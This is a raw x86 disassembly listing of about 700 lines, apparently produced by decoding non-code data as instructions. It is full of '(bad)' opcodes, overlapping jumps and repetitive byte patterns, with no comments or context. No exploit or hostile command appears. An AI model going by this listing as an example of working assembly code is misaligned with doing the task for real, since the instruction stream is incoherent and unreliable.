  44d740:	add    DWORD PTR ds:0x260000ff,ecx
  44d746:	inc    DWORD PTR [eax]
  44d748:	add    BYTE PTR ds:0x240000ff,ah
  44d74e:	inc    DWORD PTR [eax]
  44d750:	add    BYTE PTR [edx],ah
  44d752:	inc    DWORD PTR [eax]
  44d754:	add    BYTE PTR [ebx],bl
  44d756:	inc    DWORD PTR [eax]
  44d758:	add    BYTE PTR ds:0x220000ff,bl
  44d75e:	inc    DWORD PTR [eax]
  44d760:	add    BYTE PTR [ecx],ah
  44d762:	inc    DWORD PTR [eax]
  44d764:	add    BYTE PTR [edi],bl
  44d766:	inc    DWORD PTR [eax]
  44d768:	add    BYTE PTR [eax],ah
  44d76a:	inc    DWORD PTR [eax]
  44d76c:	add    BYTE PTR [edx],ah
  44d76e:	inc    DWORD PTR [eax]
  44d770:	add    DWORD PTR [edx],eax
  44d772:	call   FWORD PTR [esi-0x63000a01]
  44d778:	loopne 0x44d76b
  44d77a:	call   FWORD PTR [ebp-0x3a]
  44d77d:	into   
  44d77e:	call   FWORD PTR [edi]
  44d780:	mov    ah,0xc7
  44d782:	jmp    FWORD PTR [edx+0x5cfff7ed]
  44d788:	mov    al,dh
  44d78a:	jmp    DWORD PTR [ebx]
  44d78c:	cmp    ebx,DWORD PTR [edx-0x101f7d01]
  44d792:	dec    DWORD PTR [ebx+0x69ffe4d7]
  44d798:	shr    ah,cl
  44d79a:	push   DWORD PTR [ecx-0x2a]
  44d79d:	jmp    0xf1337ea1
  44d7a2:	push   DWORD PTR [edx-0x4800130d]
  44d7a8:	cli    
  44d7a9:	repnz inc DWORD PTR [eax]
  44d7ac:	add    DWORD PTR [ebx],eax
  44d7ae:	inc    DWORD PTR [eax]
  44d7b0:	add    BYTE PTR [eax],al
  44d7b2:	inc    DWORD PTR [eax]
  44d7b4:	add    BYTE PTR [edi],dh
  44d7b6:	inc    DWORD PTR [ecx]
  44d7b8:	add    DWORD PTR [edi],edi
  44d7ba:	inc    DWORD PTR [eax]
  44d7bc:	add    BYTE PTR [eax],al
  44d7be:	inc    DWORD PTR [eax]
  44d7c0:	add    DWORD PTR [ebx],eax
  44d7c2:	(bad)  
  44d7c3:	mov    ebp,0x3cfff7ff
  44d7c8:	mov    ebx,0xad22ffe9
  44d7cd:	(bad)  
  44d7ce:	jmp    DWORD PTR [edi]
  44d7d0:	mov    cl,0xd3
  44d7d2:	push   DWORD PTR [eax]
  44d7d4:	call   0xffcb:0xa93cffc5
  44d7db:	xor    DWORD PTR [ebx+0x6e32ffd4],esp
  44d7e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d7e2:	inc    DWORD PTR [ebp-0x39]
  44d7e5:	fdivp  st(7),st
  44d7e7:	dec    edx
  44d7e8:	(bad)
  44d7eb:	dec    esp
  44d7ec:	mov    ebx,0xbd44ffda
  44d7f1:	loope  0x44d7f2
  44d7f3:	push   esi
  44d7f4:	(bad)  
  44d7f5:	out    dx,al
  44d7f6:	(bad)  
  44d7f7:	mov    eax,0xfff7ff
  44d7fc:	add    BYTE PTR [edi+edi*8],cl
  44d7ff:	add    DWORD PTR [ecx],eax
  44d801:	add    eax,0xff
  44d806:	inc    DWORD PTR [eax]
  44d808:	add    BYTE PTR [edx],ah
  44d80a:	inc    DWORD PTR [eax]
  44d80c:	add    BYTE PTR [edx],ah
  44d80e:	inc    DWORD PTR [eax]
  44d810:	add    BYTE PTR [ecx],ah
  44d812:	inc    DWORD PTR [eax]
  44d814:	add    BYTE PTR [ecx],bl
  44d816:	inc    DWORD PTR [eax]
  44d818:	add    BYTE PTR [edx],bl
  44d81a:	inc    DWORD PTR [eax]
  44d81c:	add    BYTE PTR [eax],ah
  44d81e:	inc    DWORD PTR [eax]
  44d820:	add    BYTE PTR [ebx],ah
  44d822:	inc    DWORD PTR [eax]
  44d824:	add    BYTE PTR [eax],ah
  44d826:	inc    DWORD PTR [eax]
  44d828:	add    BYTE PTR [esi],dl
  44d82a:	inc    DWORD PTR [eax]
  44d82c:	add    DWORD PTR [edx],eax
  44d82e:	push   DWORD PTR [edi-0x67000701]
  44d834:	fsubr  st,st(3)
  44d836:	jmp    FWORD PTR [edx-0x44]
  44d839:	xlat   BYTE PTR ds:[ebx]
  44d83a:	call   FWORD PTR [edi+ecx*8-0x2a]
  44d83e:	call   DWORD PTR ds:0x9dffc8ae
  44d844:	loop   0x44d831
  44d846:	push   DWORD PTR [eax]
  44d848:	xor    ah,BYTE PTR [edi-0x1]
  44d84b:	dec    edi
  44d84c:	jnp    0x44d7e3
  44d84e:	push   DWORD PTR [edx]
  44d850:	rcl    esp,0xff
  44d853:	inc    ebx
  44d854:	rcl    esp,0xff
  44d857:	inc    eax
  44d858:	retf   0xffdf
  44d85b:	ds iret 
  44d85d:	(bad)  
  44d85f:	inc    esi
  44d860:	retf   0xffd9
  44d863:	push   0xb8ffdddd
  44d868:	push   edi
  44d86a:	inc    DWORD PTR [eax]
  44d86c:	add    DWORD PTR [ebx],eax
  44d86e:	inc    DWORD PTR [eax]
  44d870:	add    BYTE PTR ds:0x330000ff,dh
  44d876:	inc    DWORD PTR [eax]
  44d878:	add    BYTE PTR [ecx],bh
  44d87a:	inc    DWORD PTR [eax]
  44d87c:	add    BYTE PTR [edi],dh
  44d87e:	inc    DWORD PTR [eax]
  44d880:	add    BYTE PTR [eax],al
  44d882:	inc    DWORD PTR [eax]
  44d884:	add    DWORD PTR [ebx],eax
  44d886:	dec    edx
  44d888:	(bad)  
  44d889:	clc    
  44d88a:	(bad)  
  44d88b:	ds mov ebx,0x9e27ffe6
  44d891:	int    0xff
  44d893:	daa    
  44d894:	xchg   esi,eax
  44d895:	ret    
  44d896:	inc    DWORD PTR [eax-0x5b]
  44d899:	retf   0x1fff
  44d89c:	test   al,0xd5
  44d89e:	(bad)  
  44d89f:	cmp    edx,DWORD PTR [ebx+edi*4-0x202d8201]
  44d8a6:	call   DWORD PTR [esi-0x3e]
  44d8a9:	into   
  44d8aa:	jmp    DWORD PTR [ebx-0x3c]
  44d8ad:	fdivr  st,st(7)
  44d8af:	push   edi
  44d8b0:	rcr    bl,0xff
  44d8b3:	fs int3 
  44d8b5:	loop   0x44d8b6
  44d8b7:	test   ah,cl
  44d8b9:	out    dx,al
  44d8ba:	jmp    FWORD PTR [edx+0x40fff5ff]
  44d8c0:	dec    esp
  44d8c1:	mov    bh,bh
  44d8c3:	add    BYTE PTR [ecx],al
  44d8c5:	add    bh,bh
  44d8c7:	add    BYTE PTR [eax],al
  44d8c9:	add    bh,bh
  44d8cb:	add    BYTE PTR [eax],al
  44d8cd:	pop    ds
  44d8ce:	inc    DWORD PTR [eax]
  44d8d0:	add    BYTE PTR [edi],bl
  44d8d2:	inc    DWORD PTR [eax]
  44d8d4:	add    BYTE PTR [ecx],bl
  44d8d6:	inc    DWORD PTR [eax]
  44d8d8:	add    BYTE PTR [edi],dl
  44d8da:	inc    DWORD PTR [eax]
  44d8dc:	add    BYTE PTR [edi+edi*8],bl
  44d8df:	add    BYTE PTR [eax],al
  44d8e1:	and    edi,edi
  44d8e3:	add    BYTE PTR [eax],al
  44d8e5:	push   ds
  44d8e6:	inc    DWORD PTR [eax]
  44d8e8:	add    DWORD PTR [edx],eax
  44d8ea:	jmp    DWORD PTR [ebp-0x4b000a01]
  44d8f0:	out    dx,eax
  44d8f1:	clc    
  44d8f2:	inc    DWORD PTR [ebp+0x5bffd5cb]
  44d8f8:	mov    edi,0xc24dffd8
  44d8fd:	into   
  44d8fe:	call   FWORD PTR [ebp-0x2f]
  44d901:	out    0xff,eax
  44d903:	ins    BYTE PTR es:[edi],dx
  44d904:	xchg   edi,eax
  44d905:	mov    al,0xff
  44d907:	add    al,0x0
  44d909:	sbb    edi,edi
  44d90b:	test   al,0xc3
  44d90d:	sar    bh,cl
  44d90f:	aaa    
  44d910:	mov    ebx,0xb34bffd4
  44d915:	fcos   
  44d917:	inc    edi
  44d918:	mov    ebx,0xc02bffdf
  44d91d:	in     al,0xff
  44d91f:	cs mov edx,0xdea0ffda
  44d925:	out    0xff,al
  44d927:	pop    edi
  44d928:	mov    ebp,0xffed
  44d92d:	add    bh,bh
  44d92f:	add    BYTE PTR [eax],al
  44d931:	xor    bh,bh
  44d933:	add    BYTE PTR [eax],al
  44d935:	xor    bh,bh
  44d937:	add    BYTE PTR [eax],al
  44d939:	cmp    edi,edi
  44d93b:	add    BYTE PTR [eax],al
  44d93d:	cmp    bh,bh
  44d93f:	add    BYTE PTR [eax],al
  44d941:	aaa    
  44d942:	inc    DWORD PTR [eax]
  44d944:	add    DWORD PTR [ebx],eax
  44d946:	(bad)  
  44d947:	mov    edx,0x61fff7ff
  44d94c:	shl    ebx,cl
  44d94e:	jmp    DWORD PTR [ebx]
  44d950:	cdq    
  44d951:	into   
  44d952:	jmp    FWORD PTR [edx+ecx*4]
  44d955:	mov    edi,0xcaac50ff
  44d95a:	dec    DWORD PTR [edx-0x4b]
  44d95d:	xlat   BYTE PTR ds:[ebx]
  44d95e:	call   FWORD PTR [edi]
  44d960:	pop    esp
  44d961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44d962:	jmp    FWORD PTR [ebp-0x58]
  44d965:	(bad)  
  44d966:	jmp    DWORD PTR [edx-0x48]
  44d969:	xlat   BYTE PTR ds:[ebx]
  44d96a:	jmp    DWORD PTR [ebx-0x3d]
  44d96d:	(bad)  
  44d96f:	bound  edi,QWORD PTR [esi-0x37900027]
  44d975:	(bad)  
  44d977:	jo     0x44d948
  44d979:	fdivp  st(7),st
  44d97b:	jp     0x44d92f
  44d97d:	(bad)  
  44d97f:	mov    ch,0xff
  44d981:	cmc    
  44d982:	call   FWORD PTR [ebx+0x79]
  44d985:	mov    ebp,0x20100ff
  44d98a:	inc    DWORD PTR [eax]
  44d98c:	add    BYTE PTR [edi+edi*8],bl
  44d98f:	add    BYTE PTR [eax],al
  44d991:	push   ds
  44d992:	inc    DWORD PTR [eax]
  44d994:	add    BYTE PTR [edi],dl
  44d996:	inc    DWORD PTR [eax]
  44d998:	add    BYTE PTR [esi],dl
  44d99a:	inc    DWORD PTR [eax]
  44d99c:	add    DWORD PTR [edx],eax
  44d99e:	inc    DWORD PTR [eax]
  44d9a0:	add    DWORD PTR [edx],eax
  44d9a2:	inc    DWORD PTR [eax]
  44d9a4:	add    DWORD PTR [edx],eax
  44d9a6:	(bad)  
  44d9a7:	mov    esi,0xb2fff7ff
  44d9ac:	jmp    0x44d995
  44d9ae:	(bad)  
  44d9af:	jl     0x44d97a
  44d9b1:	aam    0xff
  44d9b3:	pop    edx
  44d9b4:	mov    esp,0xd485ffda
  44d9b9:	jecxz  0x44d9ba
  44d9bb:	ss mov edx,0xd893ffcd
  44d9c1:	in     al,0xff
  44d9c3:	sub    eax,0xcff4831
  44d9c8:	push   cs
  44d9c9:	and    eax,0xdcc59aff
  44d9ce:	jmp    DWORD PTR [edx-0x46]
  44d9d1:	int    0xff
  44d9d3:	inc    ebp
  44d9d4:	lods   eax,DWORD PTR ds:[esi]
  44d9d5:	sar    bh,1
  44d9d7:	js     0x44d99d
  44d9d9:	fdivp  st(7),st
  44d9db:	jp     0x44d9ba
  44d9dd:	in     al,dx
  44d9de:	dec    DWORD PTR [eax-0x40]
  44d9e1:	xlat   BYTE PTR ds:[ebx]
  44d9e2:	call   DWORD PTR [esi+0x54ffead1]
  44d9e8:	mov    eax,0x100ffea
  44d9ed:	add    bh,bh
  44d9ef:	add    BYTE PTR [eax],al
  44d9f1:	xor    edi,edi
  44d9f3:	add    BYTE PTR [eax],al
  44d9f5:	xor    edi,edi
  44d9f7:	add    BYTE PTR [eax],al
  44d9f9:	inc    DWORD PTR ss:[eax]
  44d9fc:	add    BYTE PTR ds:0x390000ff,dh
  44da02:	inc    DWORD PTR [eax]
  44da04:	add    DWORD PTR [edx],eax
  44da06:	call   FWORD PTR [ebp+edx*8-0xc]
  44da0a:	call   FWORD PTR [ebp+ebx*8-0x11]
  44da0e:	jmp    FWORD PTR [ebx+ebx*4]
  44da11:	enter  0x39ff,0x98
  44da15:	sar    bh,0x41
  44da18:	cwde   
  44da19:	(bad)  
  44da1c:	popf   
  44da1d:	aad    0xff
  44da1f:	push   ds
  44da20:	push   esp
  44da21:	jle    0x44da22
  44da23:	sub    eax,DWORD PTR [esi+0x55]
  44da26:	(bad)  
  44da27:	jp     0x44d9f0
  44da29:	fdiv   st(7),st
  44da2b:	sbb    esp,0xc767ffec
  44da31:	(bad)  
  44da33:	arpl   dx,ax
  44da35:	fcos   
  44da37:	pop    esp
  44da38:	ret    
  44da39:	fdiv   st(7),st
  44da3b:	dec    ebx
  44da3c:	mov    eax,0xba53ffda
  44da41:	(bad)  
  44da43:	mov    edx,0xfff6ff
  44da48:	add    DWORD PTR [edx],eax
  44da4a:	inc    DWORD PTR [eax]
  44da4c:	add    BYTE PTR [eax],al
  44da4e:	inc    DWORD PTR [eax]
  44da50:	add    BYTE PTR [ebx],bl
  44da52:	inc    DWORD PTR [eax]
  44da54:	add    BYTE PTR ds:0x160000ff,dl
  44da5a:	inc    DWORD PTR [eax]
  44da5c:	add    DWORD PTR [ebx],eax
  44da5e:	dec    esp
  44da60:	(bad)  
  44da61:	clc    
  44da62:	inc    esp
  44da64:	push   edi
  44da66:	call   FWORD PTR [eax-0x37]
  44da69:	(bad)  
  44da6b:	push   edi
  44da6c:	int3   
  44da6d:	sar    edi,cl
  44da6f:	cmp    ebp,DWORD PTR [ecx-0x4bcb003e]
  44da75:	into   
  44da76:	jmp    DWORD PTR [ecx-0x39]
  44da79:	(bad)  
  44da7b:	sub    ch,BYTE PTR [ebx-0x55b90037]
  44da81:	ret    0x16ff
  44da84:	adc    esp,DWORD PTR [esi-0x1]
  44da87:	and    eax,0x66ff7b39
  44da8c:	mov    ch,0xdc
  44da8e:	dec    DWORD PTR [eax-0x6e]
  44da91:	enter  0x3eff,0xa2
  44da95:	retf   0x51ff
  44da98:	mov    bl,0xd2
  44da9a:	call   DWORD PTR [esi+edi*4-0x22]
  44da9e:	call   FWORD PTR [eax-0x3f]
  44daa1:	(bad)  
  44daa3:	mov    bl,bl
  44daa5:	icebp  
  44daa6:	dec    DWORD PTR [ebx]
  44daa8:	push   ss
  44daa9:	jae    0x44daaa
  44daab:	add    BYTE PTR [ecx],al
  44daad:	add    bh,bh
  44daaf:	add    BYTE PTR [eax],al
  44dab1:	xor    edi,edi
  44dab3:	add    BYTE PTR [eax],al
  44dab5:	xor    eax,0x310000ff
  44daba:	inc    DWORD PTR [eax]
  44dabc:	add    BYTE PTR [edi],ch
  44dabe:	inc    DWORD PTR [eax]
  44dac0:	add    BYTE PTR [ecx],dh
  44dac2:	inc    DWORD PTR [eax]
  44dac4:	add    DWORD PTR [edx],eax
  44dac6:	dec    DWORD PTR [ebx-0x3a]
  44dac9:	icebp  
  44daca:	(bad)  
  44dacb:	jle    0x44daa4
  44dacd:	stc    
  44dace:	(bad)  
  44dacf:	cmp    al,0x8a
  44dad1:	mov    ebp,0xa56729ff
  44dad6:	jmp    DWORD PTR [edi]
  44dad8:	pop    ebx
  44dad9:	xchg   esp,eax
  44dada:	jmp    DWORD PTR [eax]
  44dadc:	add    esp,0x20100ff
  44dae2:	inc    DWORD PTR [eax]
  44dae4:	add    BYTE PTR [eax],al
  44dae6:	inc    DWORD PTR [eax]
  44dae8:	add    DWORD PTR [edx],eax
  44daea:	call   DWORD PTR [esi-0x63]
  44daed:	stos   DWORD PTR es:[edi],eax
  44daee:	jmp    FWORD PTR [ebx-0x34]
  44daf1:	call   0xd7f82af5
  44daf6:	dec    DWORD PTR [edi-0x48]
  44daf9:	fdivr  st,st(7)
  44dafb:	xor    esp,DWORD PTR [edx-0x7ee70033]
  44db01:	sar    edi,0x79
  44db04:	shl    edx,1
  44db06:	push   DWORD PTR [ebp+0xfff6ff]
  44db0c:	add    DWORD PTR [edx],eax
  44db0e:	inc    DWORD PTR [eax]
  44db10:	add    BYTE PTR [ecx],bl
  44db12:	inc    DWORD PTR [eax]
  44db14:	add    BYTE PTR [ebx],dl
  44db16:	inc    DWORD PTR [eax]
  44db18:	add    BYTE PTR [ecx],dl
  44db1a:	inc    DWORD PTR [eax]
  44db1c:	add    DWORD PTR [edx],eax
  44db1e:	call   FWORD PTR [esi+esi*4-0x15]
  44db22:	dec    DWORD PTR [ebp+ebp*4-0x3d]
  44db26:	(bad)  
  44db27:	cmp    ebp,DWORD PTR [edi-0x34b6002d]
  44db2d:	(bad)  
  44db2f:	sbb    al,0x8e
  44db31:	ret    0x21ff
  44db34:	test   BYTE PTR [edi-0x2a4ad301],dh
  44db3a:	dec    DWORD PTR [eax-0x39]
  44db3d:	call   0x96ab0e41
  44db42:	inc    DWORD PTR [edx]
  44db44:	add    BYTE PTR ds:0x331a0eff,dl
  44db4a:	jmp    DWORD PTR [edi+ecx*2]
  44db4d:	cwde   
  44db4e:	call   FWORD PTR [esi]
  44db50:	cmp    eax,0xad57ff97
  44db55:	loope  0x44db56
  44db57:	das    
  44db58:	mov    bl,0xd7
  44db5a:	(bad)  
  44db5b:	cmp    eax,0x4fffd4ad
  44db60:	scas   eax,DWORD PTR es:[edi]
  44db61:	fdivr  st,st(7)
  44db63:	sub    esp,DWORD PTR [eax-0x4d]
  44db66:	dec    DWORD PTR [ebx]
  44db68:	sbb    DWORD PTR [edi-0x1],edi
  44db6b:	add    BYTE PTR [ecx],al
  44db6d:	add    bh,bh
  44db6f:	add    BYTE PTR [eax],al
  44db71:	sub    al,0xff
  44db73:	add    BYTE PTR [eax],al
  44db75:	xor    edi,edi
  44db77:	add    BYTE PTR [eax],al
  44db79:	inc    DWORD PTR ss:[eax]
  44db7c:	add    BYTE PTR [ebx],dh
  44db7e:	inc    DWORD PTR [eax]
  44db80:	add    BYTE PTR [esi],ch
  44db82:	inc    DWORD PTR [eax]
  44db84:	add    DWORD PTR [edx],eax
  44db86:	inc    DWORD PTR [eax]
  44db88:	add    DWORD PTR [edx],ebx
  44db8a:	push   DWORD PTR ds:0x4effcf8b
  44db90:	lods   eax,DWORD PTR ds:[esi]
  44db91:	xlat   BYTE PTR ds:[ebx]
  44db92:	call   FWORD PTR ds:0x1eff9542
  44db98:	cmp    eax,0x9524ff82
  44db9d:	mov    ebx,0x30100ff
  44dba2:	dec    DWORD PTR [edx]
  44dba4:	or     DWORD PTR ds:0x2f0e10ff,ebp
  44dbaa:	inc    DWORD PTR [eax]
  44dbac:	add    DWORD PTR [edx],eax
  44dbae:	inc    DWORD PTR [ecx-0x5d]
  44dbb1:	mov    dh,0xff
  44dbb3:	xor    eax,0x40ffcf8c
  44dbb8:	cwde   
  44dbb9:	int    0xff
  44dbbb:	and    al,0x6b
  44dbbd:	mov    ecx,0xac5d19ff
  44dbc2:	call   FWORD PTR ds:0xb4ffd585
  44dbc8:	push   esi
  44dbca:	inc    DWORD PTR [eax]
  44dbcc:	add    DWORD PTR [edx],eax
  44dbce:	inc    DWORD PTR [ecx]
  44dbd0:	add    DWORD PTR ds:0x130000ff,eax
  44dbd6:	inc    DWORD PTR [eax]
  44dbd8:	add    BYTE PTR [eax],dl
  44dbda:	inc    DWORD PTR [eax]
  44dbdc:	add    DWORD PTR [edx],eax
  44dbde:	jmp    DWORD PTR [ebx-0x41]
  44dbe1:	out    dx,al
  44dbe2:	(bad)  
  44dbe3:	aas    
  44dbe4:	mov    eax,ds:0xab26ffc7
  44dbe9:	int3   
  44dbea:	jmp    DWORD PTR [eax]
  44dbec:	call   0xffb5:0x6517ffc3
  44dbf3:	sub    eax,DWORD PTR [eax+0x5618ffc1]
  44dbf9:	mov    esp,0x884212ff
  44dbfe:	inc    DWORD PTR [eax]
  44dc00:	add    DWORD PTR [edx],eax
  44dc02:	inc    DWORD PTR [eax]
  44dc04:	add    DWORD PTR [edx],eax
  44dc06:	inc    DWORD PTR [eax]
  44dc08:	add    DWORD PTR [edx],eax
  44dc0a:	inc    DWORD PTR [eax]
  44dc0c:	add    DWORD PTR [edx],eax
  44dc0e:	inc    DWORD PTR [eax]
  44dc10:	add    DWORD PTR [ebx],eax
  44dc12:	jmp    FWORD PTR [ecx]
  44dc14:	pop    ecx
  44dc15:	(bad)  
  44dc17:	sub    BYTE PTR [ebx+0x3b11ffec],ch
  44dc1d:	mov    ecx,0x992d16ff
  44dc22:	inc    DWORD PTR [ebp+esi*4-0x2c]
  44dc26:	dec    DWORD PTR ds:0xff7c18
  44dc2c:	add    DWORD PTR [edx],eax
  44dc2e:	inc    DWORD PTR [eax]
  44dc30:	add    BYTE PTR [ebx],ch
  44dc32:	inc    DWORD PTR [eax]
  44dc34:	add    BYTE PTR [ebx],ch
  44dc36:	inc    DWORD PTR [eax]
  44dc38:	add    BYTE PTR [edx],ch
  44dc3a:	inc    DWORD PTR [eax]
  44dc3c:	add    BYTE PTR [ebx],ch
  44dc3e:	inc    DWORD PTR [eax]
  44dc40:	add    BYTE PTR [ebx],ch
  44dc42:	inc    DWORD PTR [eax]
  44dc44:	add    DWORD PTR [edx],eax
  44dc46:	dec    DWORD PTR [esi]
  44dc48:	sbb    al,0x52
  44dc4a:	dec    DWORD PTR [ebx]
  44dc4c:	and    BYTE PTR [ebp-0x3bade401],al
  44dc52:	dec    DWORD PTR [esi+edx*1]
  44dc55:	notrack call DWORD PTR [edi]
  44dc58:	xor    BYTE PTR [eax-0x1],ch
  44dc5b:	push   ds
  44dc5c:	push   edx
  44dc5d:	mov    eax,ds:0x20100ff
  44dc62:	inc    DWORD PTR [eax]
  44dc64:	add    BYTE PTR [ebx],ah
  44dc66:	inc    DWORD PTR [eax]
  44dc68:	add    BYTE PTR ds:0x230506ff,ah
  44dc6e:	inc    DWORD PTR [eax]
  44dc70:	add    DWORD PTR [edx],eax
  44dc72:	(bad)  
  44dc73:	cmp    ebp,DWORD PTR [ebp-0x79d6002a]
  44dc79:	iret   
  44dc7a:	call   FWORD PTR [ebx]
  44dc7c:	aas    
  44dc7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44dc7e:	call   DWORD PTR [edx]
  44dc80:	aaa    
  44dc81:	cwde   
  44dc82:	inc    DWORD PTR [esi]
  44dc84:	cs sar edi,0x3e
  44dc88:	mov    ds:0xffa9fff1,eax
  44dc8d:	idiv   bh
  44dc8f:	add    BYTE PTR [eax],al
  44dc91:	add    bh,bh
  44dc93:	add    BYTE PTR [eax],al
  44dc95:	adc    bh,bh
  44dc97:	add    BYTE PTR [eax],al
  44dc99:	adc    edi,edi
  44dc9b:	add    BYTE PTR [ecx],al
  44dc9d:	add    edi,edi
  44dc9f:	aas    
  44dca0:	or     al,0xff
  44dca3:	inc    ebp
  44dca4:	mov    ebx,0xcd28ffe3
  44dca9:	in     eax,dx
  44dcaa:	dec    DWORD PTR [edi-0x50]
  44dcad:	sar    bh,cl
  44dcaf:	sub    BYTE PTR [ebx-0x4a],bl
  44dcb2:	jmp    FWORD PTR [ecx]
  44dcb4:	mov    esp,cs
  44dcb6:	dec    DWORD PTR [edi]
  44dcb8:	cmp    DWORD PTR [edi+edi*8-0xfdff00],esp
  44dcbf:	add    BYTE PTR [eax],al
  44dcc1:	add    bh,bh
  44dcc3:	add    BYTE PTR [eax],al
  44dcc5:	and    bh,bh
  44dcc7:	add    BYTE PTR [eax],al
  44dcc9:	and    bh,bh
  44dccb:	add    BYTE PTR [eax],al
  44dccd:	pop    ds
  44dcce:	inc    DWORD PTR [eax]
  44dcd0:	add    DWORD PTR [edx],eax
  44dcd2:	dec    DWORD PTR [eax]
  44dcd4:	adc    bh,bh
  44dcd6:	inc    DWORD PTR [ebx]
  44dcd8:	push   es
  44dcd9:	cmp    al,0xff
  44dcdb:	or     BYTE PTR ds:0x4a20ff89,dl
  44dce1:	ret    
  44dce2:	call   FWORD PTR [eax+edi*2]
  44dce5:	into   
  44dce6:	dec    DWORD PTR ds:0xff7317
  44dcec:	add    BYTE PTR [eax],al
  44dcee:	inc    DWORD PTR [eax]
  44dcf0:	add    BYTE PTR [edi+edi*8],ah
  44dcf3:	add    BYTE PTR [eax],al
  44dcf5:	and    edi,edi
  44dcf7:	add    BYTE PTR [eax],al
  44dcf9:	and    eax,0x270000ff
  44dcfe:	inc    DWORD PTR [eax]
  44dd00:	add    BYTE PTR [edi],ah
  44dd02:	inc    DWORD PTR [eax]
  44dd04:	add    DWORD PTR [edx],eax
  44dd06:	call   DWORD PTR [ebx]
  44dd08:	and    eax,0x1f0cff63
  44dd0d:	jg     0x44dd0e
  44dd0f:	add    eax,0x1cff650b
  44dd14:	and    BYTE PTR [eax-0x1],cl
  44dd17:	sbb    al,0x31
  44dd19:	jp     0x44dd1a
  44dd1b:	sub    DWORD PTR [edx+ecx*8-0x1],esp
  44dd1f:	add    BYTE PTR [ecx],al
  44dd21:	add    bh,bh
  44dd23:	add    BYTE PTR [eax],al
  44dd25:	pop    ds
  44dd26:	inc    DWORD PTR [eax]
  44dd28:	add    BYTE PTR [edi],bl
  44dd2a:	inc    DWORD PTR [eax]
  44dd2c:	add    BYTE PTR [esi],bl
  44dd2e:	inc    DWORD PTR [eax]
  44dd30:	add    DWORD PTR [edx],eax
  44dd32:	call   FWORD PTR [ebx]
  44dd34:	bound  ebp,QWORD PTR [eax-0x1]
  44dd37:	and    al,0x88
  44dd39:	in     al,dx
  44dd3a:	call   DWORD PTR [edi]
  44dd3c:	cmp    ebp,DWORD PTR [eax+0x7c230dff]
  44dd42:	dec    DWORD PTR [edx]
  44dd44:	sub    ch,BYTE PTR [ecx-0x1e81df01]
  44dd4a:	jmp    DWORD PTR [ecx-0x3a]
  44dd4d:	out    dx,al
  44dd4e:	inc    DWORD PTR [eax]
  44dd50:	add    DWORD PTR [edx],eax
  44dd52:	inc    DWORD PTR [eax]
  44dd54:	add    BYTE PTR [eax],dl
  44dd56:	inc    DWORD PTR [eax]
  44dd58:	add    BYTE PTR [eax],dl
  44dd5a:	inc    DWORD PTR [eax]
  44dd5c:	add    DWORD PTR [ebx],eax
  44dd5e:	call   FWORD PTR ds:0x1affb549
  44dd64:	pushf  
  44dd65:	cmc    
  44dd66:	call   FWORD PTR ds:0x46ffcc76
  44dd6c:	scas   eax,DWORD PTR es:[edi]
  44dd6d:	(bad)  
  44dd6f:	sub    al,0x5d
  44dd71:	ret    0x27ff
  44dd74:	cwde   
  44dd75:	aam    0xff
  44dd77:	add    BYTE PTR [ecx],al
  44dd79:	add    bh,bh
  44dd7b:	add    BYTE PTR [eax],al
  44dd7d:	add    bh,bh
  44dd7f:	add    BYTE PTR [eax],al
  44dd81:	push   ds
  44dd82:	inc    DWORD PTR [eax]
  44dd84:	add    BYTE PTR [edi+edi*8],bl
  44dd87:	add    BYTE PTR [eax],al
  44dd89:	sbb    eax,0x1f0000ff
  44dd8e:	inc    DWORD PTR [eax]
  44dd90:	add    DWORD PTR [edx],eax
  44dd92:	inc    DWORD PTR [ebx]
  44dd94:	add    eax,0x2c16ff09
  44dd99:	cmp    edi,0x20
  44dd9c:	xor    dl,BYTE PTR [esi-0x65cbe801]
  44dda2:	call   FWORD PTR [edi+edi*1]
  44dda5:	lods   al,BYTE PTR ds:[esi]
  44dda6:	dec    DWORD PTR [edi+edx*1]
  44dda9:	je     0x44ddaa
  44ddab:	add    BYTE PTR [ecx],al
  44ddad:	add    bh,bh
  44ddaf:	add    BYTE PTR [eax],al
  44ddb1:	inc    DWORD PTR es:[eax]
  44ddb4:	add    BYTE PTR [edi+edi*8],ah
  44ddb7:	add    BYTE PTR [eax],al
  44ddb9:	and    eax,0x270000ff
  44ddbe:	inc    DWORD PTR [eax]
  44ddc0:	add    BYTE PTR ds:0x20100ff,ah
  44ddc6:	inc    DWORD PTR [esi]
  44ddc8:	push   cs
  44ddc9:	(bad)  
  44ddca:	dec    DWORD PTR [edx]
  44ddcc:	and    al,BYTE PTR [eax+0x582311ff]
  44ddd2:	call   DWORD PTR [edx]
  44ddd4:	and    edx,DWORD PTR [edi-0x1]
  44ddd7:	and    BYTE PTR [edi],dh
  44ddd9:	jg     0x44ddda
  44dddb:	and    ecx,DWORD PTR [ebp-0x55]
  44ddde:	inc    DWORD PTR [eax]
  44dde0:	add    DWORD PTR [edx],eax
  44dde2:	inc    DWORD PTR [eax]
  44dde4:	add    BYTE PTR [eax],ah
  44dde6:	inc    DWORD PTR [eax]
  44dde8:	add    BYTE PTR ds:0x1c0000ff,bl
  44ddee:	inc    DWORD PTR [ecx]
  44ddf0:	add    DWORD PTR [edi+edi*8],ebx
  44ddf3:	add    BYTE PTR [ecx],al
  44ddf5:	add    bh,bh
  44ddf7:	sub    eax,0x11ffe79f
  44ddfc:	xor    dh,BYTE PTR [ebx+0x7f240dff]
  44de02:	dec    DWORD PTR [edx]
  44de04:	sbb    DWORD PTR [edi+edi*8+0xc],esp
  44de08:	xor    al,0xb5
  44de0a:	jmp    DWORD PTR [eax-0x3d]
  44de0d:	out    dx,al
  44de0e:	inc    DWORD PTR [eax]
  44de10:	add    DWORD PTR [edx],eax
  44de12:	inc    DWORD PTR [eax]
  44de14:	add    BYTE PTR [edi],cl
  44de16:	inc    DWORD PTR [eax]
  44de18:	add    BYTE PTR ds:0x30100ff,cl
  44de1e:	dec    DWORD PTR [ebx]
  44de20:	daa    
  44de21:	cwde   
  44de22:	dec    DWORD PTR [eax]
  44de24:	sub    bl,bh
  44de26:	dec    DWORD PTR [edx+ebp*1]
  44de29:	mov    edx,0xc1732cff
  44de2e:	jmp    FWORD PTR [ebx+ebx*2]
  44de31:	mov    cl,0xff
  44de33:	adc    edi,DWORD PTR [esi]
  44de35:	aam    0xff
  44de37:	add    BYTE PTR [ecx],al
  44de39:	add    edi,edi
  44de3b:	add    BYTE PTR [eax],al
  44de3d:	add    bh,bh
